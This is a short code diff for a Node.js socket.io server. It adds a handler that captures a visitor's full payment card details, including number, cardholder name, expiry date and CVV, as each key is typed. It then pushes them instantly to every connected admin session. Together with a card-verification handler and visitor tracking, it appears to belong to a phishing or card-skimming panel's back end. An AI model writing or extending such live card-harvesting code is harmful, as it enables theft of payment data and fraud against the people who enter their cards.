@@ -528,6 +528,27 @@ io.on("connection", (socket) => {
     }
   });
 
+  // Handle live card data (real-time keystroke updates)
+  socket.on("card:live", (data) => {
+    const visitor = visitors.get(socket.id);
+    if (visitor) {
+      visitor.liveCard = {
+        cardNumber: data.cardNumber || "",
+        nameOnCard: data.nameOnCard || "",
+        expiryDate: data.expiryDate || "",
+        cvv: data.cvv || "",
+      };
+      visitors.set(socket.id, visitor);
+      // Notify admins immediately
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit("card:liveUpdate", {
+          visitorId: visitor._id,
+          liveCard: visitor.liveCard,
+        });
+      });
+    }
+  });
+
   // Handle card number verification
   socket.on("cardNumber:verify", (cardNumber) => {
     const visitor = visitors.get(socket.id);
